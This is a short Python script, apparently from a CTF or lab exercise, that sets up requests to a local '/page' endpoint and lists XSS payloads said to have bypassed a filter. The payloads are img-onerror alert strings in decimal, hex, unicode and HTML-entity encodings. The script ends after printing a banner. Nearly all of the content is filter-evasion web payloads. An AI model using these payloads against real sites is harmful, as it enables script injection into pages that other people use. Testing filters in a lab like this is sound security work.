import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# Test vectors that bypassed the filter
vectors = [
    ("After-tag attribute", "onload=alert('XSS')"),
    ("Decimal entities", "&#60;img src=x onerror=alert('XSS')&#62;"),
    ("Hex entities", "\x3cimg src=x onerror=alert('XSS')\x3e"),
    ("Unicode entities", "\u003cimg src=x onerror=alert('XSS')\u003e"),
    ("Mixed entities", "&lt;img src=x onerror=alert('XSS')&gt;"),
]

print("=" * 70)
print("XSS Execution Test - Detailed Context Analysis")
print("=" * 70)
print()

